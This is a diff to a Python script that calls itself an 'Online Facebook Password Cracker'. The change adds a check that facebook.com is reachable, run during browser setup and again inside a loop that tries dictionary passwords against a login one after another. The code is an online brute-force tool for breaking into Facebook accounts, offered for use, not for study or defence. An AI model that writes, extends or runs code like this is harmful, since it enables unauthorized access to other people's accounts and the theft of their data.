@@ -13,6 +13,7 @@ import time
 import os
 import ConfigParser
 import urllib2
+import socket
 from multiprocessing import Process
 from pathlib import Path
 from bs4 import BeautifulSoup
@@ -34,7 +35,7 @@ def def_banner():
                                                                      
 
 
-	color_print("			Created By Th3J0k3r", color='green')
+	color_print("	Online Facebook Password Cracker -> Created By Th3J0k3r", color='green')
 
 #
 # Read in the config file.
@@ -69,10 +70,29 @@ def def_config ():
 		def_setup()
 		def_process(def_login)
 
+
+#
+# Checks to see if the internet is online
+#
+def internet_on():
+    try:
+        # connect to the host -- tells us if the host is actually
+        # reachable
+        socket.create_connection(("www.facebook.com", 80))
+        return True
+    except OSError:
+        pass
+    return False
 #
 # Setup the browser.
 #
 def def_setup():
+
+	if (internet_on() == True):
+			color_print("[+] Connection to server successfull", color='green')
+	else:
+			color_print("[!]  Connection to server failed", color='red')
+			return
 
 	# Set the socket timeout.
 	mechanize._sockettimeout._GLOBAL_DEFAULT_TIMEOUT = 100
@@ -125,7 +145,11 @@ def def_login():
 		line = fp.readline()
 	   	while line:
 	
-
+			if (internet_on() == True):
+					color_print("[+] Connection to server successfull", color='green')
+			else:
+					color_print("[!]  Connection to server failed", color='red')
+					break
 			# This is the current password in the dictionary 
 			# that we attempt to login with
 			#
